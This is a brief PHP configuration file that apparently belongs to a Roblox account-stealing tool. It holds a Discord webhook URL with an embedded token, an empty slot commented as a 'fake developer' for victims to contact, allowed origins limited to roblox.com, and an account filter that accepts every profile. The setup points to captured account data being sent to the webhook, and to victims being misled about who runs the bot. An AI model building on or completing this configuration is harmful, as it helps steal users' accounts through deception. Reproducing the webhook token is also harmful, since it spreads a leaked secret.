<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/802993729236631592/SlINsHB5MrNQ-0FHSkN1MDkVywvxIY52a7R2fz3tUpuwWilKKjQtAjbXbmTaRhWitijp";
    // fake developer for the bot the users may contact
    $discord_contact = "";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>